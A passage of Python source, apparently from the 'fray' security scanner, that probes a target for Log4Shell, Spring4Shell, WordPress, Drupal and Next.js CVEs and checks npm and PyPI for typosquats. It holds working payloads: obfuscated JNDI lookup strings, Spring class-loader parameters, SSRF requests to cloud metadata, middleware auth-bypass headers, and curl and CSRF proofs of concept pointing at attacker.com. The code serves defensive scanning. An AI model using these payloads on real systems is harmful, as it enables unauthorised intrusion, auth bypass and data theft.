            PAYLOADS_DIR / "auth_bypass",
            pathlib.Path(__file__).parent.parent.parent / "payloads" / "ai_prompt_injection",
        ]
        for d in search_dirs:
            if not d.exists():
                continue
            for f in d.glob("*.json"):
                try:
                    data = json.loads(f.read_text(encoding="utf-8"))
                    for p in data.get("payloads", []):
                        cve = p.get("cve", "")
                        payload = p.get("payload", "")
                        # Extract x-middleware-subrequest values from payload strings
                        if "CVE-2025-29927" in cve and "x-middleware-subrequest:" in payload:
                            for line in payload.split("\\r\\n"):
                                if line.lower().startswith("x-middleware-subrequest:"):
                                    val = line.split(":", 1)[1].strip()
                                    if val and val not in bypass_vals:
                                        bypass_vals.append(val)
                except Exception:
                    continue
        return bypass_vals + [d for d in defaults if d not in bypass_vals] if bypass_vals else defaults
    except Exception:
        return defaults


def check_log4shell(host: str, port: int, use_ssl: bool,
                    timeout: int = 6) -> Dict[str, Any]:
    """Detect Log4Shell (CVE-2021-44228) vulnerability.

    Sends JNDI lookup strings in common injection headers.
    Uses a canary-based approach: inserts a unique probe token and checks
    if the server attempts to resolve it (OOB detection).

    Since OOB DNS callbacks require an external listener, this function
    uses the passive approach: checks if the server echoes back the JNDI
    string (indicating it processed but didn't execute it) or returns
    an error that reveals Log4j is in use.
    """
    result: Dict[str, Any] = {
        "vulnerable": False,
        "potential": False,
        "evidence": [],
        "severity": "info",
    }

    # Injection headers — Log4j processes these on every request
    _JNDI_PROBE = "${jndi:ldap://127.0.0.1:1389/fray-probe}"
    _JNDI_VARIANTS = [
        "${jndi:ldap://127.0.0.1:1389/a}",
        "${${::-j}${::-n}${::-d}${::-i}:ldap://127.0.0.1:1389/a}",  # obfuscated
        "${${lower:j}ndi:ldap://127.0.0.1:1389/a}",                   # case bypass
        "${jndi:rmi://127.0.0.1:1099/a}",
        "${jndi:dns://127.0.0.1/a}",
    ]

    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        import http.client as _hc
        conn = (_hc.HTTPSConnection(host, port, timeout=timeout, context=ctx)
                if use_ssl else _hc.HTTPConnection(host, port, timeout=timeout))

        for probe in _JNDI_VARIANTS[:2]:  # 2 probes — passive only
            conn.request("GET", "/", headers={
                "Host": host,
                "User-Agent": probe,
                "X-Api-Version": probe,
                "X-Forwarded-For": probe,
                "Accept": "*/*",
            })
            resp = conn.getresponse()
            body = resp.read(4096).decode("utf-8", errors="replace")

            # Passive indicators of Log4j processing
            if any(sig in body for sig in [
                "JNDI", "jndi", "log4j", "Log4j", "NamingException",
                "com.sun.jndi", "javax.naming",
            ]):
                result["potential"] = True
                result["evidence"].append({
                    "header": "User-Agent / X-Api-Version",
                    "payload": probe[:60],
                    "indicator": "JNDI reference in response body",
                })
            conn.close()
    except Exception:
        pass

    if result["potential"]:
        result["severity"] = "critical"
        result["evidence"].append({
            "note": (
                "Passive indicators only — confirm with OOB DNS callback. "
                "Run: curl -H 'X-Api-Version: ${jndi:ldap://COLLABORATOR_HOST/a}' "
                f"https://{host}/"
            )
        })

    return result


def check_spring4shell(host: str, port: int, use_ssl: bool,
                       timeout: int = 6) -> Dict[str, Any]:
    """Detect Spring4Shell (CVE-2022-22965) RCE vulnerability.

    CVE-2022-22965 affects Spring MVC/WebFlux running on JDK 9+ with
    a WAR deployment. The exploit uses class loader manipulation via
    data binding to write a webshell.

    Detection: send the characteristic payload as a POST parameter.
    A 400 response with Spring error text (vs 404 or 500 without) suggests
    Spring is processing the parameter.
    """
    result: Dict[str, Any] = {
        "vulnerable": False,
        "potential": False,
        "evidence": [],
        "severity": "info",
    }

    # Spring4Shell detection payload — class loader manipulation
    _S4S_PARAMS = (
        "class.module.classLoader.URLs[0]=0"
        "&class.module.classLoader.URLs[1]=0"
    )
    _S4S_HEADERS = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Suffix": ".jsp",
        "C": "Runtime",
        "DNT": "1",
    }

    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        import http.client as _hc
        conn = (_hc.HTTPSConnection(host, port, timeout=timeout, context=ctx)
                if use_ssl else _hc.HTTPConnection(host, port, timeout=timeout))
        h = {"Host": host, "User-Agent": "fray/3.5", **_S4S_HEADERS}
        conn.request("POST", "/", body=_S4S_PARAMS, headers=h)
        resp = conn.getresponse()
        body = resp.read(4096).decode("utf-8", errors="replace")
        conn.close()

        spring_indicators = [
            "spring", "Spring", "springframework",
            "WhitelabelError", "Whitelabel Error Page",
            "Type=Bad Request", "400", "MissingServletRequestParameterException",
            "BindException", "TypeMismatchException",
        ]
        if any(ind in body for ind in spring_indicators):
            result["potential"] = True
            result["evidence"].append({
                "method": "POST",
                "path": "/",
                "payload": _S4S_PARAMS[:80],
                "status": resp.status,
                "indicator": "Spring Framework error response detected",
            })
            result["severity"] = "critical"

    except Exception:
        pass

    return result


def check_wordpress_cves(host: str, port: int, use_ssl: bool,
                         timeout: int = 6) -> Dict[str, Any]:
    """Detect WordPress and probe for common high-severity CVEs.

    Fingerprints WordPress version, then probes for:
    - CVE-2019-9978: Social Warfare SSRF
    - CVE-2020-8772: InfiniteWP authentication bypass
    - CVE-2020-10564: Thrive Themes file upload RCE
    - Generic: xmlrpc.php exposure, user enumeration, debug log
    """
    result: Dict[str, Any] = {
        "is_wordpress": False,
        "version_hint": None,
        "confirmed": [],
        "potential": [],
        "severity": "info",
    }

    def _get(path: str, headers: Optional[Dict[str, str]] = None) -> tuple:
        try:
            return _http_get(host, port, path, use_ssl,
                             timeout=timeout, max_redirects=1,
                             extra_headers=headers or {})
        except Exception:
            return 0, {}, ""

    # Step 1: Confirm WordPress
    s, h, b = _get("/")
    is_wp = any(kw in b for kw in [
        "wp-content", "wp-includes", "wp-login", "WordPress",
        'name="generator" content="WordPress',
    ])
    result["is_wordpress"] = is_wp
    if not is_wp:
        return result

    # Extract version
    ver_m = re.search(r'WordPress[^0-9]*([0-9]+\.[0-9]+\.?[0-9]*)', b)
    if ver_m:
        result["version_hint"] = ver_m.group(1)

    # Step 2: CVE probes
    # xmlrpc.php — exposed = user enumeration + brute force surface
    s_xml, _, b_xml = _get("/xmlrpc.php")
    if s_xml == 200 and "XML-RPC" in b_xml:
        result["potential"].append({
            "cve": "WORDPRESS-XMLRPC",
            "severity": "high",
            "evidence": "xmlrpc.php exposed — enables user enumeration and brute force attacks",
            "path": "/xmlrpc.php",
        })

    # User enumeration via /?author=1
    s_usr, h_usr, _ = _get("/?author=1")
    if s_usr in (301, 302):
        loc = h_usr.get("location", "")
        if "/author/" in loc:
            result["potential"].append({
                "cve": "WP-USER-ENUM",
                "severity": "medium",
                "evidence": f"User enumeration: /?author=1 redirects to {loc}",
                "path": "/?author=1",
            })

    # CVE-2020-8772: InfiniteWP auth bypass — POST to /wp-login.php
    s_iwp, _, b_iwp = _get("/wp-login.php")
    if s_iwp == 200:
        result["potential"].append({
            "cve": "CVE-2020-8772",
            "severity": "critical",
            "evidence": "wp-login.php accessible — InfiniteWP auth bypass probe possible",
            "path": "/wp-login.php",
            "note": "Manual: POST {\"iwp_action\":\"add_site\"} with base64 payload",
        })

    # CVE-2019-9978: Social Warfare plugin SSRF
    s_sw, _, b_sw = _get(
        "/wp-admin/admin-post.php?swp_debug=load_options"
        "&swp_url=http://169.254.169.254/latest/meta-data/"
    )
    if s_sw == 200 and len(b_sw) > 50:
        result["confirmed"].append({
            "cve": "CVE-2019-9978",
            "severity": "critical",
            "evidence": f"Social Warfare SSRF: admin-post.php responded with {len(b_sw)} bytes",
            "path": "/wp-admin/admin-post.php",
        })

    # Debug log exposure
    for log_path in ["/wp-content/debug.log", "/debug.log"]:
        s_log, _, b_log = _get(log_path)
        if s_log == 200 and any(kw in b_log for kw in ["PHP", "Warning", "Error", "Notice"]):
            result["potential"].append({
                "cve": "WP-DEBUG-LOG",
                "severity": "medium",
                "evidence": f"{log_path} exposed — PHP errors leak internal paths and info",
                "path": log_path,
            })
            break

    if result["confirmed"]:
        result["severity"] = "critical"
    elif result["potential"]:
        result["severity"] = "high"

    return result


def check_drupal_cves(host: str, port: int, use_ssl: bool,
                      timeout: int = 6) -> Dict[str, Any]:
    """Detect Drupal and probe for Drupalgeddon (CVE-2018-7600) and related CVEs."""
    result: Dict[str, Any] = {
        "is_drupal": False,
        "version_hint": None,
        "confirmed": [],
        "potential": [],
        "severity": "info",
    }

    def _get(path: str) -> tuple:
        try:
            return _http_get(host, port, path, use_ssl,
                             timeout=timeout, max_redirects=1)
        except Exception:
            return 0, {}, ""

    # Fingerprint Drupal
    s, h, b = _get("/")
    is_drupal = any(kw in b for kw in [
        "Drupal", "drupal", "/sites/default/", "/sites/all/",
        'generator" content="Drupal',
    ])
    result["is_drupal"] = is_drupal
    if not is_drupal:
        return result

    # Extract version
    ver_m = re.search(r'Drupal\s+([0-9]+\.[0-9]+\.?[0-9]*)', b)
    if ver_m:
        result["version_hint"] = ver_m.group(1)

    # CVE-2018-7600 (Drupalgeddon2) — probe via user registration
    s_dg2, _, b_dg2 = _get(
        "/user/register?element_parents=account/mail/%23value"
        "&ajax_form=1&_wrapper_format=drupal_ajax"
    )
    if s_dg2 in (200, 400, 422):
        result["potential"].append({
            "cve": "CVE-2018-7600",
            "severity": "critical",
            "evidence": (
                f"Drupalgeddon2 probe path returned {s_dg2} — "
                "manual verification required"
            ),
            "path": "/user/register?element_parents=...",
        })

    # Check for accessible admin paths
    for path in ["/admin", "/admin/config", "/user/login"]:
        s_adm, _, _ = _get(path)
        if s_adm == 200:
            result["potential"].append({
                "cve": "DRUPAL-ADMIN-EXPOSURE",
                "severity": "medium",
                "evidence": f"{path} accessible",
                "path": path,
            })
            break

    if result["confirmed"]:
        result["severity"] = "critical"
    elif result["potential"]:
        result["severity"] = "high"

    return result


def check_nextjs_cves(host: str, port: int, use_ssl: bool,
                      timeout: int = 6) -> Dict[str, Any]:
    """Detect Next.js-specific CVEs via targeted HTTP probes.

    Bypass values for CVE-2025-29927 are loaded from the payload database
    so new PoCs added via `fray feed --auto-add` are automatically used.

    Only fires if the target has been fingerprinted as Next.js (caller responsibility).
    Returns confirmed, potential, and informational findings with evidence.
    """
    result: Dict[str, Any] = {
        "is_nextjs": False,
        "version_hint": None,
        "confirmed": [],   # CVEs with strong evidence
        "potential": [],   # CVEs with circumstantial evidence
        "info": [],        # informational (fingerprint, recon)
        "severity": "info",
    }

    def _get(path: str, headers: Optional[Dict[str, str]] = None,
             method: str = "GET") -> tuple:
        try:
            return _http_get(host, port, path, use_ssl,
                             timeout=timeout, max_redirects=0,
                             extra_headers=headers or {})
        except Exception:
            return 0, {}, ""

    # ── Step 1: Confirm Next.js ──────────────────────────────────────────────
    status, resp_headers, body = _get("/")
    is_next = (
        "__NEXT_DATA__" in body or
        "/_next/static/" in body or
        resp_headers.get("x-powered-by", "").lower().startswith("next") or
        resp_headers.get("x-nextjs-cache") is not None
    )
    if not is_next:
        # Also check /_next/static probe
        s2, h2, b2 = _get("/_next/static/")
        is_next = s2 in (200, 404) and (
            resp_headers.get("x-powered-by", "").lower().startswith("next") or
            "__NEXT_DATA__" in body
        )

    result["is_nextjs"] = is_next

    # Extract version from __NEXT_DATA__ or x-powered-by
    version_match = re.search(r'"buildId"\s*:\s*"([^"]{4,64})"', body)
    xpb = resp_headers.get("x-powered-by", "")
    ver_match = re.search(r'Next\.js\s+([\d.]+)', xpb, re.I)
    if ver_match:
        result["version_hint"] = ver_match.group(1)

    # ── CVE-2025-29927: middleware auth bypass ────────────────────────────────
    # Real PoC (from Vercel fix commit 5fd3ae8 + public writeups):
    #   curl https://target/dashboard \
    #     -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"
    # The value is the middleware path repeated with colons. The internal header
    # is used to signal "this subrequest came from middleware" to avoid re-entry.
    # Simple string "middleware" may work on some versions; the colon-repeat is
    # what the actual PoC and Vercel's own test case use.
    # Load bypass values from payload DB — automatically picks up new PoCs
    # added via `fray feed --auto-add` without requiring code changes
    _mw_bypass_vals = _load_nextjs_bypass_values()
    # Probe several protected-looking paths to maximise detection chance
    _protected_paths = ["/admin", "/dashboard", "/account", "/api/admin",
                        "/api/v1/admin", "/settings"]
    _mw_confirmed = False
    for probe_path in _protected_paths[:3]:
        s_base, _, _ = _get(probe_path)
        if s_base not in (401, 403, 302):
            continue  # path not protected, skip
        for bypass_val in _mw_bypass_vals:
            s, h, b = _get(probe_path, headers={"x-middleware-subrequest": bypass_val})
            if s == 200:
                result["confirmed"].append({
                    "cve": "CVE-2025-29927",
                    "severity": "critical",
                    "evidence": (
                        f"GET {probe_path} returned {s_base} normally but 200 with "
                        f"x-middleware-subrequest: {bypass_val!r} — "
                        f"middleware auth bypassed (CVSS 9.1)"
                    ),
                    "path": probe_path,
                    "header": f"x-middleware-subrequest: {bypass_val}",
                    "poc": f"curl https://{host}{probe_path} -H 'x-middleware-subrequest: {bypass_val}'",
                })
                _mw_confirmed = True
                break
        if _mw_confirmed:
            break
    if not _mw_confirmed:
        # Passive indicator: if x-middleware-subrequest-id is absent in responses,
        # server may not have the fix applied (patched servers add this header
        # to internal subrequests)
        result["potential"].append({
            "cve": "CVE-2025-29927",
            "severity": "high",
            "evidence": (
                "No protected path found for active bypass test. "
                "If Next.js <14.2.25 or <15.2.3 is confirmed, assume vulnerable. "
                f"Manual test: curl https://{host}/admin "
                "-H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware'"
            ),
        })

    # ── CVE-2026-27978: null-origin CSRF on Server Actions ───────────────────
    # Real PoC: Server Actions are triggered via POST with Next-Action header.
    # The CSRF check compares Origin to Host — "null" was treated as absent.
    # We must send POST (not GET), include the Next-Action header, and compare
    # Origin: null vs Origin: https://attacker.com response codes.
    #
    # Step 1: Discover Server Action endpoints from page source
    # Server Action IDs appear as hex strings in the JS bundle; we look for
    # the next-action header pattern in responses or action="..." in forms.
    sa_endpoints: list = []

    # Check if homepage has Server Actions (look for Next-Action in allowed methods)
    _, main_headers, main_body = _get("/")
    if "next-action" in str(main_headers).lower() or "$ACTION_ID" in main_body:
        sa_endpoints.append("/")

    # Common Server Action paths
    for sa_path in ["/api/actions", "/api/action", "/actions", "/"]:
        # First check: does a POST with Next-Action header get a meaningful response?
        s_probe, h_probe, _ = _get(
            sa_path,
            headers={
                "Next-Action": "0" * 40,   # dummy 40-char hex action ID
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": f"https://{host}",
            },
        )
        # 400/422 = action not found but Server Actions active (vs 404/405 = not SA endpoint)
        if s_probe in (400, 422, 200):
            sa_endpoints.append(sa_path)

    for sa_path in (sa_endpoints[:2] or ["/"]):
        # Compare null-origin vs cross-origin on POST
        # Both should be rejected (403) or both accepted (200) on a correct server
        _post_headers_null = {
            "Next-Action": "0" * 40,
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "null",
        }
        _post_headers_cross = {
            "Next-Action": "0" * 40,
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://attacker.example.com",
        }
        s_null, _, _ = _get(sa_path, headers=_post_headers_null)
        s_cross, _, _ = _get(sa_path, headers=_post_headers_cross)

        # Vulnerable: null-origin accepted (200/400/422) but cross-origin rejected (403)
        if s_null in (200, 400, 422) and s_cross == 403:
            result["confirmed"].append({
                "cve": "CVE-2026-27978",
                "severity": "high",
                "evidence": (
                    f"POST {sa_path} with Next-Action header: "
                    f"Origin: null → {s_null}, Origin: attacker.example.com → {s_cross} — "
                    f"null origin accepted, cross-origin rejected (CSRF bypass confirmed)"
                ),
                "path": sa_path,
                "poc": (
                    f"<iframe sandbox='allow-scripts allow-forms' "
                    f"src='https://attacker.com/csrf.html'>"
                    f"<!-- csrf.html POSTs to https://{host}{sa_path} "
                    f"with Origin: null -->"
                ),
            })
            break
        elif s_null == s_cross and s_null not in (404, 405, 0):
            # Both same — inconclusive but endpoint found
            result["info"].append({
                "cve": "CVE-2026-27978",
                "note": (
                    f"Server Action endpoint {sa_path} found but null/cross-origin "
                    f"responses identical ({s_null}) — may be patched or not vulnerable"
                ),
            })
    else:
        result["potential"].append({
            "cve": "CVE-2026-27978",
            "severity": "medium",
            "evidence": (
                "Could not locate active Server Action endpoint for CSRF test. "
                "If app uses Next.js Server Actions and version is >=16.0.1 <16.1.7, "
                "manually test: POST an action endpoint with Origin: null vs "
                "Origin: https://attacker.com and compare response codes."
            ),
        })

    # ── CVE-2026-27979: PPR resume DoS probe ─────────────────────────────────
    # Check if next-resume header causes different response (indicates PPR enabled)
    s_ppr, h_ppr, _ = _get("/", headers={"next-resume": "1"})
    s_base2, _, _ = _get("/")
    if s_ppr != s_base2 or h_ppr.get("content-type", "") != resp_headers.get("content-type", ""):
        result["potential"].append({
            "cve": "CVE-2026-27979",
            "severity": "high",
            "evidence": (
                f"next-resume: 1 header causes different response ({s_base2}→{s_ppr}) — "
                f"PPR may be enabled; vulnerable to unbounded body buffering DoS"
            ),
            "workaround": "Block 'next-resume' header at edge/proxy",
        })
    elif s_ppr == 200:
        result["info"].append({
            "cve": "CVE-2026-27979",
            "note": "next-resume header accepted (200) but response identical — PPR status unclear",
        })

    # ── CVE-2026-29057: HTTP smuggling on rewrite routes ─────────────────────
    # We can only passively check: confirm rewrite routes exist via /_next/rewrite
    # or by observing X-Matched-Path / location headers
    s_rw, h_rw, _ = _get("/api/proxy")  # common rewrite target name
    xmp = h_rw.get("x-matched-path", "")
    if xmp and xmp != "/api/proxy":
        result["potential"].append({
            "cve": "CVE-2026-29057",
            "severity": "high",
            "evidence": (
                f"x-matched-path header indicates rewrites active ({xmp!r}) — "
                f"send chunked DELETE/OPTIONS to trigger boundary disagreement"
            ),
            "note": "Manual verification: DELETE /api/proxy with Transfer-Encoding: chunked",
        })

    # ── Image optimization SSRF check ────────────────────────────────────────
    s_img, _, b_img = _get("/_next/image?url=http://169.254.169.254/&w=64&q=75")
    if s_img == 200 and len(b_img) > 100:
        result["confirmed"].append({
            "cve": "NEXT-IMAGE-SSRF",
            "severity": "critical",
            "evidence": (
                f"/_next/image fetched http://169.254.169.254/ (AWS metadata) and returned "
                f"200 with {len(b_img)} bytes — SSRF via image optimization endpoint"
            ),
            "path": "/_next/image",
        })
    elif s_img == 400:
        result["info"].append({
            "note": "/_next/image present but domain not in allowlist (400) — correctly configured",
        })

    # Set overall severity
    if result["confirmed"]:
        cvss_vals = [7.0]
        if "CVE-2025-29927" in str(result["confirmed"]):
            cvss_vals.append(10.0)
        if "CVE-2026-29057" in str(result["confirmed"]):
            cvss_vals.append(8.8)
        if "NEXT-IMAGE-SSRF" in str(result["confirmed"]):
            cvss_vals.append(8.0)
        cvss = max(cvss_vals)
        result["severity"] = "critical" if cvss >= 9.0 else "high"
    elif result["potential"]:
        result["severity"] = "high"

    return result


# ---------------------------------------------------------------------------
# #297  Docker Registry Exposure
# ---------------------------------------------------------------------------

def check_docker_registry(host: str, timeout: int = 5) -> Dict[str, Any]:
    """#297 — Detect exposed Docker registries on standard and common ports.

    Probes:
      - /v2/            → registry ping (200 or 401 = registry present)
      - /v2/_catalog    → list all repos (200 = open/anonymous access)
      - /v2/<name>/tags/list → tag enumeration if catalog works

    Severity:
      - critical  : anonymous read access to /v2/_catalog
      - high      : registry present but requires auth (401 on /v2/)
      - info      : no registry found
    """
    result: Dict[str, Any] = {
        "registry_present": False,
        "anonymous_access": False,
        "repositories": [],
        "ports_found": [],
        "severity": "info",
        "evidence": "",
    }

    # Docker registries run on 5000 (plain), 443 (TLS), 5001 (alt TLS), 6000
    _REGISTRY_PORTS = [
        (5000, False),   # standard dev registry
        (443,  True),    # TLS (e.g. gcr.io, quay.io style self-hosted)
        (5001, True),    # alt TLS
        (6000, False),   # less common
    ]

    for port, use_ssl in _REGISTRY_PORTS:
        try:
            # Step 1: ping /v2/
            status, headers, body = _http_get(
                host, port, "/v2/", use_ssl, timeout=timeout, max_redirects=1
            )
            if status not in (200, 401, 403):
                continue

            result["registry_present"] = True
            result["ports_found"].append(f"{'https' if use_ssl else 'http'}://{host}:{port}")

            # Step 2: try /v2/_catalog (anonymous access check)
            cat_status, _, cat_body = _http_get(
                host, port, "/v2/_catalog", use_ssl, timeout=timeout, max_redirects=0
            )
            if cat_status == 200 and "repositories" in cat_body:
                result["anonymous_access"] = True
                result["severity"] = "critical"
                try:
                    import json as _json
                    cat_data = _json.loads(cat_body)
                    repos = cat_data.get("repositories", [])
                    result["repositories"] = repos[:20]
                    result["evidence"] = (
                        f"Anonymous access to Docker registry at {host}:{port} — "
                        f"{len(repos)} repo(s) enumerated: {', '.join(repos[:5])}"
                        + (f" … and {len(repos)-5} more" if len(repos) > 5 else "")
                    )
                except Exception:
                    result["evidence"] = f"Anonymous access to Docker registry at {host}:{port} (catalog endpoint open)"
            elif status == 401:
                if result["severity"] == "info":
                    result["severity"] = "high"
                if not result["evidence"]:
                    result["evidence"] = (
                        f"Docker registry detected at {host}:{port} — "
                        f"authentication required (probe /v2/_catalog with credentials)"
                    )
            break  # found a registry on this port, stop scanning
        except Exception:
            continue

    if not result["registry_present"]:
        result["evidence"] = f"No Docker registry found on standard ports ({host})"

    return result


# ---------------------------------------------------------------------------
# #134/#135  NPM / PyPI Package Typosquatting Detection
# ---------------------------------------------------------------------------
# Extracts package names used by the target (from package.json, requirements.txt,
# JS bundles) and checks for typosquat candidates on public registries.
# A typosquat is a package name 1-2 edits away from a known-used package that
# already exists on npm/PyPI — a supply chain attack vector.
# ---------------------------------------------------------------------------

def _levenshtein(a: str, b: str) -> int:
    """Fast Levenshtein distance (edit distance) between two strings."""
    if a == b:
        return 0
    if not a:
        return len(b)
    if not b:
        return len(a)
    if len(a) < len(b):
        a, b = b, a
    prev = list(range(len(b) + 1))
    for i, ca in enumerate(a, 1):
        curr = [i]
        for j, cb in enumerate(b, 1):
            curr.append(min(prev[j] + 1, curr[j-1] + 1,
                            prev[j-1] + (0 if ca == cb else 1)))
        prev = curr
    return prev[-1]


def _generate_typosquats(name: str) -> List[str]:
    """Generate common typosquat variants of a package name."""
    variants: set = set()
    chars = "abcdefghijklmnopqrstuvwxyz0123456789-_"

    # 1. Single character substitutions
    for i, c in enumerate(name):
        for r in chars:
            if r != c:
                variants.add(name[:i] + r + name[i+1:])

    # 2. Single character omissions
    for i in range(len(name)):
        variants.add(name[:i] + name[i+1:])

    # 3. Single character insertions
    for i in range(len(name) + 1):
        for c in chars:
            variants.add(name[:i] + c + name[i:])

    # 4. Common separator swaps (- vs _)
    if "-" in name:
        variants.add(name.replace("-", "_"))
    if "_" in name:
        variants.add(name.replace("_", "-"))

    # 5. Common prefix/suffix tricks
    variants.add(name + "-dev")
    variants.add(name + "-utils")
    variants.add("python-" + name)
    variants.add(name + "js")

    # Remove the original name and very short variants
    variants.discard(name)
    return [v for v in variants if len(v) >= 3]


def check_npm_typosquatting(
    packages: List[str],
    timeout: int = 5,
    max_packages: int = 20,
    max_variants_per_pkg: int = 30,
) -> Dict[str, Any]:  # noqa: E501
    """#134 — Check npm packages used by target for typosquat risks.

    For each package name, generates typosquat candidates and checks whether
    those candidates exist on the npm registry. A hit means an attacker has
    already registered a package that looks like one the target uses.

    Args:
        packages: List of package names extracted from target (package.json etc.)
        timeout:  HTTP timeout per registry check
        max_packages: cap on packages to check (rate limiting)
        max_variants_per_pkg: cap on variants per package

    Returns:
        Dict with hits list and severity.
    """
    hits: List[Dict[str, Any]] = []
    checked = 0

    for pkg in packages[:max_packages]:
        if not pkg or len(pkg) < 3:
            continue
        variants = _generate_typosquats(pkg)[:max_variants_per_pkg]
        for variant in variants:
            try:
                req = urllib.request.Request(
                    f"https://registry.npmjs.org/{urllib.parse.quote(variant, safe='')}",
                    method="HEAD",
                    headers={"User-Agent": "fray-security-scanner/1.0"},
                )
                with urllib.request.urlopen(req, timeout=timeout) as resp:
                    if resp.status == 200:
                        dist = _levenshtein(pkg, variant)
                        if dist <= 2:
                            hits.append({
                                "original": pkg,
                                "typosquat": variant,
                                "edit_distance": dist,
                                "registry": "npm",
                                "url": f"https://www.npmjs.com/package/{variant}",
                                "severity": "critical" if dist == 1 else "high",
                                "evidence": (
                                    f"npm package '{variant}' exists and is 1 edit away "
                                    f"from your dependency '{pkg}' — potential typosquat"
                                ),
                            })
                checked += 1
            except urllib.error.HTTPError as e:
                if e.code == 404:
                    checked += 1
            except Exception:
                pass

    severity = "critical" if any(h["severity"] == "critical" for h in hits) else \
               "high" if hits else "info"

    return {
        "hits": hits,
        "packages_checked": len(packages[:max_packages]),
        "variants_checked": checked,
        "severity": severity,
        "summary": (
            f"{len(hits)} typosquat candidate(s) found on npm for your dependencies"
            if hits else "No npm typosquat candidates found"
        ),
    }


def check_pypi_typosquatting(  # noqa: E501
    packages: List[str],
    timeout: int = 5,
    max_packages: int = 20,
    max_variants_per_pkg: int = 30,
) -> Dict[str, Any]:
    """#135 — Check PyPI packages used by target for typosquat risks.

    Same approach as check_npm_typosquatting but against pypi.org/pypi/{pkg}/json.
    """
    hits: List[Dict[str, Any]] = []
    checked = 0

    for pkg in packages[:max_packages]:
        if not pkg or len(pkg) < 3:
            continue
        variants = _generate_typosquats(pkg)[:max_variants_per_pkg]
        for variant in variants:
            try:
                req = urllib.request.Request(
                    f"https://pypi.org/pypi/{urllib.parse.quote(variant, safe='')}/json",
                    method="HEAD",
                    headers={"User-Agent": "fray-security-scanner/1.0"},
                )
                with urllib.request.urlopen(req, timeout=timeout) as resp:
                    if resp.status == 200:
                        dist = _levenshtein(pkg, variant)
                        if dist <= 2:
                            hits.append({
                                "original": pkg,
                                "typosquat": variant,
                                "edit_distance": dist,
                                "registry": "pypi",
                                "url": f"https://pypi.org/project/{variant}/",
                                "severity": "critical" if dist == 1 else "high",
                                "evidence": (
                                    f"PyPI package '{variant}' exists and is 1 edit away "
                                    f"from your dependency '{pkg}' — potential typosquat"
                                ),
                            })
                checked += 1
            except urllib.error.HTTPError as e:
                if e.code == 404:
                    checked += 1
            except Exception:
                pass

    severity = "critical" if any(h["severity"] == "critical" for h in hits) else \
               "high" if hits else "info"

    return {
        "hits": hits,
        "packages_checked": len(packages[:max_packages]),
        "variants_checked": checked,
        "severity": severity,
        "summary": (
            f"{len(hits)} typosquat candidate(s) found on PyPI for your dependencies"
            if hits else "No PyPI typosquat candidates found"
        ),
    }
